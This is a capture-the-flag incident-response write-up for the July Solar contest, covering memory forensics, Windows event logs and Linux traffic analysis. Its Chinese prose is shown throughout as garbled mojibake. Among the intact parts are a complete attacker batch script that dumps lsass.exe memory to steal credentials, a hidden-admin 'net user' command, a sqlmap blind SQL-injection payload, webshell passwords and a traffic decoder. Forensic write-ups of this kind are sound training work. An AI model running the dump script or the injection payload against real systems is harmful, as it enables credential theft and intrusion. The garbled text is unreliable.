---
date:
  created: 2025-07-26
  updated: 2025-10-04
tags:
  - Solar
  - CTF
comments: true
---

# Solar åº”æ€¥å“åº”èµ› 7 æœˆ Writeup

å…¶å®žä»Žä¸Šä¸ªæœˆå¼€å§‹å¹³å°å°±æ”¯æŒåŸºäºŽè¿œç¨‹è¿žæŽ¥çš„é¶æœºçŽ¯å¢ƒåº”æ€¥å“åº”äº†ï¼Œä½†æ˜¯å¾ˆå¯æƒœé‚£å¤©è€ƒè¯•æ²¡èƒ½åŽ»åšqwq

ä¸è¿‡è¿™æ¬¡æœˆèµ›ç»™çš„é¢˜é‡ä¹Ÿå¤Ÿå¤§ï¼Œçˆ½èµ¤ðŸ˜ƒðŸ‘

- æ—¶é—´ï¼š7 æœˆ 26 æ—¥ 10:00~18:00
- é™„ä»¶å¤§å°ï¼šå†…å­˜é•œåƒï¼Œå¤§å°è®°ä¸æ¸…äº†ï¼Œåæ­£ä¸å¤§

!!! info "é™„ä»¶åˆ†ç±»"

    - VOL_EASYï¼šæŸ Windows ç‰ˆæœ¬
    - åº”æ€¥å¤§å¸ˆï¼šWindows Server 2008
    - å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æŽ’æŸ¥ï¼šLinux

## VOL_EASY

é™„ä»¶ç»™å‡ºå†…å­˜é•œåƒï¼Œä½¿ç”¨ MemProcFS ä¸Ž Volatility3 è¿›è¡ŒæŒ‚è½½ä¸Žåˆ†æžã€‚

### 1. ä¸€å¥è¯æœ¨é©¬å¯†ç 

æ–‡ä»¶åˆ—è¡¨ä¸­æœç´¢ `php` æ–‡ä»¶å³å¯æ‰¾åˆ°ä¸€å¥è¯æœ¨é©¬ã€‚

![](img/07/ezshell-backdoor.png)

### 2 - 3: æœ¨é©¬è¿žæŽ¥å·¥å…·

åœ¨ `Tools` æ–‡ä»¶å¤¹å‘çŽ°äº†èšå‰‘åŠ è½½å™¨ï¼š

- è¿žæŽ¥å·¥å…·ï¼š`Antsword.exe`
- ä½ç½®ï¼š`C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe`

### 4. èŽ·å–åˆ°çš„ FLAG

åœ¨ç®¡ç†å‘˜ç”¨æˆ·æ¡Œé¢å¯æ‰¾åˆ° flag ä¸º `flag{ok!get_webshell_is_good_idea~}`ã€‚

![](img/07/admin-flag.png)

### 5 - 7: å¯¹å¤–æ”»å‡»

æŸ¥æ‰¾æµè§ˆå™¨ç—•è¿¹ï¼Œåœ¨ `C:\Users\Administrator\AppData\Local\Microsoft\Internet Explorer\Recovery\High\Active` ä¸­å¯æ‰¾åˆ°åä¸ºâ€œå›¾åºŠç¨‹åºâ€çš„ç½‘ç«™ `http://192.168.186.140`ã€‚å…¥ä¾µæ—¶ä½¿ç”¨çš„ç³»ç»Ÿç”¨æˆ·åå³ä¸ºå½“å‰ç”¨æˆ·å `Administrator`ã€‚

`C:\Users\Administrator\AppData\Roaming\AntSword\Local Storage\leveldb` çš„æ—¥å¿—æ–‡ä»¶ä¸­æœ‰éƒ¨åˆ†èšå‰‘æ“ä½œæ—¥å¿—ï¼Œå…¶ä¸­æ‰§è¡Œäº† `net user solar$ solar2025 /add`ï¼Œå¯¹åº”çš„è´¦æˆ·å¯†ç ä¸º `solar2025`ã€‚

### 8 - 10: é¶æœºæ“ä½œç¨‹åº

åœ¨æ®‹å­˜çš„æ—¥å¿—ä¸­å‘çŽ° `dump_lass.bat` è¿™ä¸€æ‰¹å¤„ç†æ–‡ä»¶åï¼Œåº”è¯¥æ˜¯åœ¨è¿œç¨‹é¶æœºæ‰§è¡Œçš„ï¼Œä½†ä»åœ¨å†…å­˜ä¸­å¯»æ‰¾åˆ°äº†è¯¥æ–‡ä»¶ï¼š

```batch
@echo off
echo [*] æ­£åœ¨èŽ·å– lsass.exe PID...

for /f "tokens=2 delims=," %%a in ('tasklist /FI "IMAGENAME eq lsass.exe" /FO CSV /NH') do (
    set PID=%%~a
)

if "%PID%"=="" (
    echo [!] æœªæ‰¾åˆ° lsass.exe è¿›ç¨‹ï¼Œæˆ–æ²¡æœ‰æƒé™ã€‚
    pause
    exit /b 1
)

echo [*] PID: %PID%
echo [*] æ­£åœ¨å°è¯•å¯¼å‡ºå†…å­˜è½¬å‚¨...

set OUTPUT=%~dp0lsass.dmp

rundll32.exe comsvcs.dll, MiniDump %PID% %OUTPUT% full

if exist "%OUTPUT%" (
    echo [âœ“] æˆåŠŸå¯¼å‡º lsass å†…å­˜ä¸º: %OUTPUT%
) else (
    echo [!] å¯¼å‡ºå¤±è´¥ï¼Œå¯èƒ½æƒé™ä¸è¶³ã€‚
)

pause
```

é¢˜ä¸­æåŠçš„â€œé‡è¦ç¨‹åºâ€å³ä¸º `lsass.exe`ã€‚

è€ƒè™‘åˆ°æ— æ³•è®¿é—®åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè€Œä½¿ç”¨èšå‰‘ç»ˆç«¯æ‰§è¡Œçš„å‘½ä»¤å›žæ˜¾å¯èƒ½ä»åœ¨å†…å­˜ä¸­ï¼Œä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ç›´æŽ¥æ‰“å¼€å†…å­˜æ–‡ä»¶æœç´¢ `lsass`ï¼Œä¾¿å¯å‘çŽ°è¯¥è„šæœ¬çš„è¾“å‡ºï¼š

![](img/07/sword-dump.png)

`lsass.exe` çš„ PID ä¸º `456`ï¼Œè½¬å‚¨ä¿å­˜åœ¨ `C:\phpstudy_pro\WWW\lsass.dmp`ã€‚

## åº”æ€¥å¤§å¸ˆ

### 1. éšè—ç”¨æˆ·

ä½¿ç”¨ VNC ç™»å½•è¿œç¨‹æ¡Œé¢æ—¶ï¼Œå³å¯åœ¨æ¬¢è¿Žå±å¹•æ‰¾åˆ°éšè—ç”¨æˆ· `solar$`ã€‚

![](img/07/login-hidden-user.png)

### 2. IP æº¯æº

æµè§ˆç½‘é¡µæœåŠ¡å™¨ç›®å½•ä¸‹çš„ `nginx.log.txt` æ—¥å¿—ï¼Œé€šè¿‡è¿žæŽ¥ä¸­æ–­çš„è®°å½•å¯ä»¥æ‰¾åˆ°æ”»å‡»è€… IP ä¸º `192.168.186.139`ã€‚

![](img/07/closed-connection-log.png)

### 3. ä¸€å¥è¯æœ¨é©¬

åœ¨ç½‘é¡µæœåŠ¡å™¨ `C:\phpstudy_pro\WWW\uploads` ç›®å½•ä¸‹å¯æ‰¾åˆ°ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬ï¼š

![](img/07/phpstudy-backdoor.png)

å¯†ç ä¸º `solar2025`ã€‚

### 4 - 7: äº‹ä»¶åˆ†æž

åœ¨äº‹ä»¶æŸ¥çœ‹å™¨çš„`å®‰å…¨`åˆ†ç±»ä¸­æŸ¥çœ‹éšè—è´¦æˆ·ä¸Žç™»å½•ç›¸å…³çš„æ—¥å¿—è®°å½•ã€‚æœç´¢ `solar$` å…³é”®è¯ï¼Œå³å¯æ‰¾åˆ°è´¦æˆ·åˆ›å»ºè®°å½•ï¼Œä»Žä¸­äº¦å¯èŽ·å¾— TargetSidã€‚

![](img/07/create-event-entry.png)

![](img/07/create-event-detail.png)

åœ¨äº‹ä»¶åˆ—è¡¨ä¸­å¯»æ‰¾åŠ å…¥ç”¨æˆ·ç»„çš„äº‹ä»¶ï¼Œä»Žä¸‹åˆ°ä¸Šèƒ½å‘çŽ°å…¶åŠ å…¥äº† `None`ã€`Users`ã€`Administrators` ä¸‰ä¸ªç”¨æˆ·ç»„ï¼Œå…¶ä¸­ `None` ç”¨æˆ·ç»„åœ¨æäº¤æ—¶å› ä¸æ­£ç¡®è€ŒæŽ’é™¤ï¼Œç­”æ¡ˆä¸º `Users-Administrators`ã€‚

è¿œç¨‹æ¡Œé¢ç™»å½•ç›¸å…³çš„äº‹ä»¶ ID ä¸º 1149ï¼ˆè¿œç¨‹ç™»å½•ï¼‰ä¸Ž 4624ï¼ˆç™»å½•äº‹ä»¶ï¼‰ï¼Œæ®æ­¤ç»“åˆç”¨æˆ·åæœç´¢å¯æ‰¾åˆ°å¯¹åº”çš„ç™»å½•è®°å½•ï¼ˆIP åœ°å€ä¸Žç«¯å£éžå›žçŽ¯ï¼‰ã€‚

![](img/07/remote-login-entry.png)

IP åœ°å€ä¸º `192.168.186.139:49197`ã€‚

## å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æŽ’æŸ¥

### 1. SQL æ³¨å…¥çˆ†ç ´

ç®€å•æµè§ˆæµé‡ï¼Œæ”»å‡»è€…ä½¿ç”¨ SQLmap è¿›è¡Œçˆ†ç ´ã€‚

`/var/log/apache2/access.log` è®°å½•äº†æ‰€æœ‰è¯·æ±‚ç»†èŠ‚ï¼Œå¯ä»¥ä»Žä¸­æå–çˆ†ç ´è¿‡ç¨‹ä¸Žæ­£ç¡®ä¿¡æ¯ã€‚åšé¢˜è¿‡ç¨‹ä¸­ç¬”è€…å°†æ—¥å¿—ä¸­çš„ URL å…ˆè¿›è¡Œäº†è§£ç ï¼Œä¾¿äºŽè¿›ä¸€æ­¥å¤„ç†ã€‚

```py
import base64

lines = []
output: list[str] = []

with open("download.log", "r") as f:
    lines = f.readlines()
    f.close()

for l in lines:
    start = l.find("query=")
    end = l.find(" HTTP")

    if start != -1 and end != -1:
        query = l[start+6:end+1]
        # print(query)

        try:
            dq = base64.b64decode(query)
            print(dq.decode())
            output.append(f"{dq.decode()}\n")
        except:
            pass

with open("sqled.log", "w") as ff:
    ff.writelines(output)
    ff.close()
```

æå–å‡ºå…¸åž‹çš„è®°å½•å¦‚ä¸‹ï¼š

```sql
' AND (SELECT 8495 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM bus_system.bus_drivers ORDER BY password LIMIT 2,1),1,1))>64,0,1)))))mXas) AND 'nOQP'='nOQP
```

SQLmap åœ¨æ”»å‡»è¿‡ç¨‹ä¸­ä¼šå¯¹æ•°æ®æŒ‰æ¡æŒ‰ä½è¿›è¡ŒçŒœæµ‹ï¼ˆæ­¤è¿‡ç¨‹ä¸­æ¡ä»¶ä½¿ç”¨**å¤§äºŽ**ï¼‰ï¼Œåœ¨æ‰¾åˆ°æ­£ç¡®çš„ä¿¡æ¯åŽä¼šä½¿ç”¨**ä¸ç­‰äºŽ**æ¡ä»¶è¿›è¡ŒéªŒè¯ï¼Œå› æ­¤ç›´æŽ¥åœ¨ `username` å¯¹åº”å­—æ®µæœç´¢ `!=` å³å¯å¾ˆå¿«æ‰¾åˆ°å‰ä¸¤ä¸ªç”¨æˆ·åã€‚

```py
a = [115, 117, 110, 121, 117, 101]
b = [99, 104, 101, 110, 104, 97, 111]
```

è½¬æ¢å‡ºæ¥åˆ†åˆ«æ˜¯ `sunyue` ä¸Ž `chenhao`ã€‚

### 2. FTP æœåŠ¡

è¯¥æµé‡ä¸­çš„ FTP ä¿¡æ¯æ˜Žæ–‡ä¼ è¾“ï¼Œé›†ä¸­åœ¨æ•´ä¸ªé™„ä»¶çš„åŽåŠæ®µã€‚ç®€å•æŸ¥æ‰¾åŽåœ¨ 7075 æµå‘çŽ°äº† FTP åˆ—å‡ºæ–‡ä»¶çš„è®°å½•ï¼Œå‘åŽæŸ¥çœ‹å³å¯èŽ·å¾—æ–‡ä»¶å†…å®¹ã€‚

![](img/07/ftp-content.png)

![](img/07/credential-content.png)

### 3 - 5: WebShell + æŒ–çŸ¿æœ¨é©¬åˆ†æž

æ”»å‡»è€…ä¸Šä¼ çš„ WebShell ä½äºŽ `/var/www/html/public/uploads/shell1.php`ï¼š

![](img/07/shell1-script.png)

å¾—åˆ°å¯†ç ä¸º `woaiwojia`ã€‚

ç»ç”± WebShell äº¤æ¢çš„æ•°æ®ä½¿ç”¨äº† Base64 åŠ è§£å¯†ä¸Žå›ºå®šå¯†é’¥çš„æŒ‰ä½å¼‚æˆ–ï¼Œè§£å¯†èµ·æ¥è¾ƒä¸ºç®€å•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŽç»­æµé‡å‡ä½¿ç”¨äº† GZip åŽ‹ç¼©ï¼Œåœ¨å¤„ç†æ—¶ä¹Ÿéœ€è€ƒè™‘åœ¨å†…ï¼š

```py
import base64
import gzip
import io

def decode(data: bytes, key: bytes) -> bytes:
    """
    è§£å¯†å‡½æ•°ï¼ˆä¸Ž PHP encode å®Œå…¨å¯¹ç§°ï¼‰
    :param data: å¯†æ–‡ bytes
    :param key:  å¯†é’¥ bytes
    :return:     æ˜Žæ–‡ bytes
    """
    kl = len(key)
    if kl < 16:
        # è‹¥å¯†é’¥ä¸è¶³ 16 å­—èŠ‚ï¼ŒæŒ‰ PHP é€»è¾‘å¾ªçŽ¯ä½¿ç”¨ï¼ˆä¹Ÿå¯æŒ‰éœ€å¡«å……ï¼‰
        key = (key * ((16 // kl) + 1))[:16]

    out = bytearray()
    for i, ch in enumerate(data):
        k = key[(i + 1) & 15]
        out.append(ch ^ k)
    return bytes(out)

if __name__ == '__main__':
    original_base = input()

    original = base64.b64decode(original_base.encode())
    print(original)
    key = b"3c6e0b8a9c15224a"

    # æ¨¡æ‹ŸåŠ å¯†ï¼ˆç”¨åŒä¸€å‡½æ•°ï¼‰
    encrypted = decode(original, key)

    try:
        with gzip.GzipFile(fileobj=io.BytesIO(encrypted)) as f:
                plain = f.read()
        print("è§£åŽ‹åŽæ˜Žæ–‡ï¼š", plain)
    except Exception as e:
        print("è§£åŽ‹å¤±è´¥ï¼š", e)
```

ç”±é¢˜ä¸­æŒ‡å‡ºâ€œåœ¨ç”¨æˆ·è®¿é—®åŽæ¶ˆè€—ç”¨æˆ·çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿â€ï¼Œå¯ä»¥æŽ¨æ–­æœ¨é©¬ä»£ç åœ¨å‰ç«¯ã€‚

ç½‘é¡µæœåŠ¡å™¨å‰ç«¯ç›®å½•ä½äºŽ `/var/www/html/public`ï¼Œå®¡è®¡ä»£ç ä¸­å‘çŽ° `index.php` æœ‰å¤šä½™çš„è„šæœ¬ï¼Œå¦‚ä¸‹å›¾ï¼š

![](img/07/extra-code-php.png)

å°†å…¶æ ¼å¼åŒ–åŽå¯ä»¥å‘çŽ°å…¶ä¸­æœ‰ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œæ€€ç–‘å¯¹åº”çš„æ˜¯å­—ç¬¦ ASCII ç ï¼š

![](img/07/sus-array.png)

å°†å…¶è¿›è¡Œè½¬åŒ–å³å¯å¾—åˆ°çŸ¿æ± åœ°å€ `gulf.moneroocean.stream:10128`ã€‚

ç½‘é¡µæºä»£ç ä¸­çš„æ¶æ„ä»£ç é€šå¸¸ä¹Ÿæ˜¯ç»ç”± WebShell ä¸Šä¼ çš„ï¼ŒäºŽæ˜¯ç»§ç»­åˆ†æžæµé‡ï¼Œå¯åœ¨ 7102 æµå¤„çš„è¯·æ±‚ä¿¡æ¯ä¸­æ‰¾åˆ°åŽŸä¸Šä¼ æ–‡ä»¶åä¸º `map.php`ã€‚

![](img/07/name-extraction.png)
